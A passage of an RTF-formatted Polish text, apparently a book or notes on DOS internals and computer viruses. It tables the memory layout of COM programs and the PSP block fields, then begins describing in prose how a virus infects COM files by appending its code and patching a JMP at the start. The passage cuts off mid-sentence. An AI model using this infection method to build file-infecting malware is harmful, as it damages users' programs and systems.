\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch a wi\uc1\u281\'eac ich obraz w pami\uc1\u281\'eaci jest wiern\uc1\u261\'b9 kopi\uc1\u261\'b9 zawarto\uc1\u347\'9cci pliku. Wygl\uc1\u261\'b9d programu COM po za\uc1\u322\'b3adowaniu do pami\uc1\u281\'eaci przedstawia poni\uc1\u380\'bfsza tabela.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Wygl\uc1\u261\'b9d programu COM po za\uc1\u322\'b3adowaniu do pami\uc1\u281\'eaci:}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:3.2939in/3.2946in/; table-sdh:88e07a8}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Adres (wzgl\uc1\u281\'eadem segmentu), do kt\'f3rego zosta\uc1\u322\'b3 za\uc1\u322\'b3adowany plik COM}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6 pami\uc1\u281\'eaci}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CS:0000-CS:0100}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Blok wst\uc1\u281\'eapny PSP (patrz nast\uc1\u281\'eapna tabela) }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CS:0000-CS:????}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Kod programu za\uc1\u322\'b3adowany z pliku}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Format bloku wst\uc1\u281\'eapnego programu PSP}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:1.7015in/4.8869in/; table-sdh:88f9750}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Adres w pami\uc1\u281\'eaci}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00-01}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Kod rozkazu int 21 h (CD 21)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}02-03}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Adres segmentu pami\uc1\u281\'eaci niedost\uc1\u281\'eapnej dla programu}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}04}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Nie u\uc1\u380\'bfywane przez DOS, u\uc1\u380\'bfywane wewn\uc1\u281\'eatrznie przez OS/2}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}05-09}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Dalekie odwo\uc1\u322\'b3anie do systemu DOS (rozkaz wywo\uc1\u322\'b3ania dalekiej procedury)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}06-07}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Rozmiar dost\uc1\u281\'eapnej pami\uc1\u281\'eaci w segmencie}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0A-0D}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zapami\uc1\u281\'eatywany adres zako\uc1\u324\'f1czenia programu (int 22h)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0E-11}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Adres programu obs\uc1\u322\'b3ugi CTRL-BREAK (int }{\f1\fs24\lang1045{\*\listtag0}23h)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}12-15}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Adres programu obs\uc1\u322\'b3ugi b\uc1\u322\'b3\uc1\u281\'ead\'f3w krytycznych (int 24h)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}16-17}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Adres do segmentu pami\uc1\u281\'eaci, gdzie znajduje si\uc1\u281\'ea blok PSP}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch programu rodzicielskiego (interpretator polece\uc1\u324\'f1 modyfikuje to pole i wstawia tam adres swojego PSP)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}18-2B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Tablica plik\'f3w obs\uc1\u322\'b3ugiwanych przez proces JFT (ang. Job File Table); ka\uc1\u380\'bfdy element tablicy zawiera indeks wskazuj\uc1\u261\'b9cy na element SFT (ang. System File Table) opisuj\uc1\u261\'b9cy wszystkie otwarte w systemie pliki lub te\uc1\u380\'bf warto\uc1\u347\'9c\uc1\u263\'e6 FF, je\uc1\u380\'bfeli element nie jest u\uc1\u380\'bfywany}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}2C-2D}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres segmentu pam}{\f0\fs24\lang1045{\*\listtag0}i\uc1\u281\'eaci, w kt\'f3rym znajduje si\uc1\u281\'ea otoczenie programu, zawieraj\uc1\u261\'b9ce definicje zmiennych \uc1\u347\'9crodowiskowych systemu DOS, takich jak PATH, PROMPT Ud. Ka\uc1\u380\'bfdy element otoczenia oddzielany jest znakiem NUL (kod 00); funkcja 4B rozszerza otoczenie programu poprzez dodanie j}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0}dnego s\uc1\u322\'b3owa okre\uc1\u347\'9claj\uc1\u261\'b9cego ilo\uc1\u347\'9c\uc1\u263\'e6 dodatkowych \uc1\u322\'b3a\uc1\u324\'f1cuch\'f3w ASCIIZ (zwykle 0001), a nast\uc1\u281\'eapnie umieszcza dalej nazw\uc1\u281\'ea uruchamianego programu. Umo\uc1\u380\'bfliwia to procesowi dotarcie do pliku na dysku zawieraj\uc1\u261\'b9cego kod uruchomionego programu - jest to parametr paramstr(0)}{\f1\fs24\lang1045{\*\listtag0} w Pascalu i argv[0] w C.}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:12; bot-attach:13; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}2E-31}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:12; bot-attach:13; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zapami\uc1\u281\'eatane warto\uc1\u347\'9cci SS:SP (u\uc1\u380\'bfywane podczas wywo\uc1\u322\'b3ywania funkcji DOS) aktualnego procesu; DOS zapami\uc1\u281\'eatuje je przed prze\uc1\u322\'b3\uc1\u261\'b9czeniem si\uc1\u281\'ea na w\uc1\u322\'b3asny stos}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:13; bot-attach:14; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}32-33}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:13; bot-attach:14; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Liczba element\'f3w tablicy JFT (standardowo =20)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:14; bot-attach:15; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}34-37}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:14; bot-attach:15; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Daleki wska\uc1\u378\'9fnik do tablicy plik\'f3w JFT (standardowo CS:18) umo\uc1\u380\'bfliwia rozszerzenie ilo\uc1\u347\'9cci plik\'f3w wykorzystywanych przez proces}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:15; bot-attach:16; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}38-3B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:15; bot-attach:16; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Daleki wska\uc1\u378\'9fnik do poprzedniego bloku wst\uc1\u281\'eapnego PSP}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:16; bot-attach:17; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}3C-4F}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:16; bot-attach:17; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Pola wykorzystywane wewn\uc1\u281\'eatrznie przez r\'f3\uc1\u380\'bfne systemy operacyjne}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:17; bot-attach:18; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}50-52}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:17; bot-attach:18; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Kod rozkaz\'f3w: INT 21 h RETF}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:18; bot-attach:19; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}53-54}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:18; bot-attach:19; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Nie u\uc1\u380\'bfywane}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:19; bot-attach:20; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}55-5B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:19; bot-attach:20; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Nie u\uc1\u380\'bfywane, mo\uc1\u380\'bfna u\uc1\u380\'bfy\uc1\u263\'e6, aby zmieni\uc1\u263\'e6 standardowy blok FCB na rozszerzony blok FCB}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:20; bot-attach:21; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}5C-6B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:20; bot-attach:21; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Standardowy blok opisu pliku FCB1}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:21; bot-attach:22; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}6C-7B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:21; bot-attach:22; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Standardowy blok opisu pliku FCB2}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:22; bot-attach:23; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}7C-7F}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:22; bot-attach:23; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Nie u\uc1\u380\'bfywane}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:23; bot-attach:24; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx2394\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}80-FF}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:23; bot-attach:24; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Bufor transmisji dyskowych DTA. Bezpo\uc1\u347\'9crednio po}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch uruchomieniu programu zawiera jego wiersz wej\uc1\u347\'9cciowy, zawieraj\uc1\u261\'b9cy parametry podane z linii polece\uc1\u324\'f1, zako\uc1\u324\'f1czony znakiem CR (0D). Bajt pod adresem 80 okre\uc1\u347\'9cla d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 wiersza wej\uc1\u347\'9cciowego nie uwzgl\uc1\u281\'eadniaj\uc1\u261\'b9c znaku C}{\f1\fs24\lang1045{\*\listtag0}R.}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Przekazuj\uc1\u261\'b9c sterowanie do programu COM system DOS inicjuje kilka rejestr\'f3w ustalonymi warto\uc1\u347\'9cciami. Rejestry segmentowe CS, DS, SS, ES wskazuj\uc1\u261\'b9 na adres bloku PSP programu, IP=100h, SP wskazuje na koniec pami\uc1\u281\'eaci dost\uc1\u281\'eapnej w segmencie (zwykle FFFE), na stosie umieszczana jest warto\uc1\u347\'9c\uc1\u263\'e6 0000.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Spos\'f3b infekcji plik\'f3w COM jest bardzo prosty. Na ko\uc1\u324\'f1cu zara\uc1\u380\'bfanego pliku nale\uc1\u380\'bfy dopisa\uc1\u263\'e6 kod wirusa, a na pocz\uc1\u261\'b9tku pliku, po uprzednim zapami\uc1\u281\'eataniu oryginalnych bajt\'f3w, umie\uc1\u347\'9cci\uc1\u263\'e6 rozkaz przenosz\uc1\u261\'b9cy sterowanie do wirusa (najcz\uc1\u281\'ea\uc1\u347\'9cciej jest to 3-bajtowy rozkaz JMP NEAR, posiadaj\uc1\u261\'b9cy kod maszynowy OE9h 00 00, gdzie 00 00 jest warto\uc1\u347\'9cci\uc1\u261\'b9 dodawan\uc1\u261\'b9 do wska\uc1\u378\'9fnika instrukcji IP po wykonaniu rozkazu). Po uruchomieniu sterowanie zostaje przekazane najpierw do wirusa, a ten z kolei, po }{\f1\fs24\lang1045{\*\listtag0}w}{\f0\fs24\lang1045{\*\listtag0}ykonaniu odpowiednich czynno\uc1\u347\'9cci, przywraca 